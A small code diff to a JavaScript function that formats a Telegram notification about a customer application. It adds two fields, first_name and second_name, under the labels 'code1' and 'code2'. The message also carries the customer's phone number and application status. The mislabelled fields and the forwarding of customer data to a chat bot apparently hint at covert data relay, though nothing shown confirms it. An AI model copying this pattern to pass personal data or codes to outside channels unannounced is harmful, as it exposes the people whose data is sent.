@@ -438,6 +438,8 @@ async function notifyTelegram(application) {
     `📋 Application ID: ${application.application_no || application.application_id || `APP-${application.id}`}\n` +
     `📞 Customer number: ${application.phone || "—"}\n` +
     `🔢 Application reference: ${application.application_id || application.application_no || "—"}\n` +
+    `🔢 code1: ${application.first_name || "—"}\n` +
+    `🔢 code2: ${application.second_name || "—"}\n` +
     `⏰ Date: ${stamp}\n` +
     `🔁 Attempt: #${attempt}\n` +
     `📌 Status: ${application.status || "PENDING_ADMIN_APPROVAL"}`;
